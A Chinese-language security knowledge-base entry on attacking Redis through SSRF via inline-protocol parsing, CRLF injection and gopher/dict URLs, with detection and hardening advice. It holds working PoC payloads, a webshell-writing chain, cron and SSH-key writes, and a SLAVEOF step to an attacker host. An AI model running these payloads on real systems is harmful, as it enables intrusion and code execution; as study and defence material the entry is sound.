---
id: web-generic-ssrf-redis-inline-protocol-crlf
title: SSRF 打 Redis：inline 协议、CRLF 注入与认证 pipeline
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-redis-inline-protocol-crlf
aliases:
- SSRF 打 Redis
- Redis inline 协议
- RESP 兼容解析
- dict 协议打 Redis
- gopher 打 Redis
- weblogic SSRF CRLF
- Redis 未授权写文件
tags:
- ssrf
- redis
- inline-protocol
- resp
- crlf
- gopher
- dict
- unauthorized
- file-write
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:12:56+08:00'
  notes: 已对照原文与抓包/源码图核对；inline协议、dict单命令限制、auth pipeline、weblogic CRLF、写文件与主从复制说法均对应；未复跑
---

## 一句话结论

Redis 为兼容手工调试，会把“不以 `*` 开头”的输入当作 INLINE 命令、按空格切分后直接执行；因此只要 SSRF 点能控制一整行 TCP 数据（`dict://`、`gopher://`、HTTP 头/体注入或 weblogic 这类自带 CRLF 的 SSRF），就能不经 RESP 编码直接向 Redis 发命令；有密码时用一次 TCP 连接内多行 pipeline（`AUTH` + 业务命令）完成认证与利用。

## 原理

- Redis 正常使用 RESP：数组以 `*N` 开头，字符串以 `$len` 开头，命令与参数各占一行。但 `networking.c` 在请求类型未知时判断首字节：如果 `c->querybuf[c->qb_pos] == '*'` 走 `PROTO_REQ_MULTIBULK`，否则走 `PROTO_REQ_INLINE`，随后 `processInlineBuffer` 用 `sdssplitargs` 按空白切分该行并当作命令执行。
- 这意味着 `SET key value\r\n` 这样的纯文本行与 RESP 编码等价；`CONFIG GET dir`、`CONFIG SET`、`SLAVEOF` 等都能直接用明文发。图片中的抓包显示，一个普通 HTTP 请求打到 6379 时，Redis 把 `POST`、`Content-Type`、`Host` 等逐行当作未知命令报错，而最后一行 `set key 123123` 成功返回 `+OK`。
- `dict://` 协议只能携带一条命令且不能带换行，所以适合单条 `CONFIG GET dir`、`INFO` 这类探测；有 `requirepass` 时需要先 `AUTH` 再执行命令，而 Redis 支持 pipelining——在一次连接里连续发送多行，服务端逐条处理并逐条返回，因此把 `AUTH xxx\r\nSET key value\r\n` 放在同一个 TCP 载荷里即可。
- 能构造多行的入口：HTTP 请求头注入 CRLF、POST body 直接作为后续行、weblogic `SearchPublicRegistries` 之类内部用 socket 拼 HTTP 且 data 部分可注入的 SSRF、`gopher://`（可编码任意二进制/换行）、数据库外连（MySQL `load_file`/MongoDB `copyDatabase`/PostgreSQL `dblink`）等。curl 7.71.1 起对 gopher 有额外限制，必要时改用其他能发原始 TCP 的入口。
- 拿到命令执行能力后，常见落地点：`CONFIG SET dir` + `CONFIG SET dbfilename` + `SET` + `SAVE` 写 webshell/计划任务/`authorized_keys`；RDB 会带脏数据，webshell 通常不受影响，计划任务与 SSH 公钥需用换行/注释规避；Debian/Ubuntu 对 cron 文件格式与权限要求严格，CentOS 更宽松。主从复制（`SLAVEOF`/`REPLICAOF`）可同步任意二进制内容且无脏数据，适合写二进制或更干净的落地。

## 触发条件

- 存在 SSRF 入口，且能控制完整一行或多行 TCP 数据（`gopher`、`dict`、CRLF 注入、原始 socket、可控 POST body）。
- 目标 Redis 可达（常见 6379，未改端口/未 bind 127.0.0.1），且未启用 ACL 限制或已获得口令。
- 需要写文件时，Redis 进程对目标目录有写权限，且 `CONFIG`/`SAVE` 未被 rename/禁用。
- 有密码时，入口必须能发送多行（pipeline）或在同连接内先发 `AUTH`；只能发单条命令的 `dict://` 不足以完成认证后的利用。

## 利用步骤

1. 用 `dict://host:6379/config:get:dir` 或 `INFO` 探测 Redis 是否可达、是否要求认证、当前工作目录。
2. 读取 `/etc/passwd`（若 SSRF 支持 file://）或应用配置文件，确认是否存在 `redis` 用户及 `requirepass`。
3. 无密码：直接用多行/gopher 发送 `CONFIG SET dir <web目录>`、`CONFIG SET dbfilename shell.jsp`、`SET x '<webshell>'`、`SAVE`。
4. 有密码：在同一连接内先 `AUTH <password>`，再发上述命令；用 pipeline 一次发送全部行。
5. 若文件写入受限，改用主从复制：`SLAVEOF <attacker> 6379` 加载恶意 RDB，或写计划任务/SSH 公钥。
6. 访问落地文件或等待计划任务执行，验证命令执行。

## PoC

```text
# 单命令探测（dict 只能发一条）
dict://127.0.0.1:6379/config:get:dir
# 返回：$8\r\nD:\Redis\r\n  （或目标工作目录）

# 无密码，多行明文命令（HTTP body 被 Redis 当作逐行 inline 命令）
POST / HTTP/1.1
Host: 127.0.0.1:6379
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

set key 123123

# 有密码，pipeline：认证与业务命令在同一 TCP 连接
auth 123456
set key1 123123

# gopher：%0d%0a 即 CRLF
gopher://127.0.0.1:6379/_auth%20123456%0d%0aset%20key%20123123%0d%0a
```

```text
# 写文件链（示意，路径按目标调整）
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.jsp
SET x "<%@ page import=\"java.util.*\" %><% ... %>"
SAVE
```

## 变体与关联

- 变体：weblogic `SearchPublicRegistries.jsp?operator=http://...` 的 SSRF 内部用 socket 发 POST，可在可控 header 处注入 CRLF，从而打有密码 Redis；原文将其作为 Redis 的实战入口。
- 变体：`dict://` 单命令探测；`gopher://` 完整二进制；HTTP 请求体多行；数据库 `load_file`/`dblink`/`copyDatabase` 外连。
- 变体：写 webshell、cron、`authorized_keys`；主从复制写任意文件。
- 关联：[[pentest-privilege-escalation-redis-local-ssh-key-root]]（本地可连 Redis 写公钥提权）、[[web-generic-ssrf-cloud-metadata]]（同一 SSRF 原语的另一条内网利用）、[[web-java-framework-spring-custom-auth-path-parsing-bypass]] 无关，仅作入口对照。
- 边界：Redis 启用 ACL/`rename-command`、`protected-mode` 且仅本机、目标目录不可写、入口只能发 GET 无 CRLF、curl 版本限制 gopher 时失效。

## 检测与防御

- 检测：6379 上出现非 RESP 的明文命令；SSRF 请求目标为内网 6379；Redis 日志中的 `CONFIG SET dir`/`dbfilename`/`SLAVEOF`；Web 目录突然出现带 RDB 头或 JSP/PHP 内容的文件；cron/authorized_keys 被修改。
- 修复：Redis 绑定 127.0.0.1 或内网 ACL、启用 `requirepass`/ACL、`protected-mode yes`；`rename-command` 禁用 `CONFIG`/`SLAVEOF`/`SAVE` 等；以低权限用户运行且不可写 Web 目录。
- 加固：SSRF 入口做协议白名单（仅 http/https）、禁止 gopher/dict/file、解析后校验目标 IP 并禁止内网/链路本地；出站防火墙限制 6379 与元数据网段。
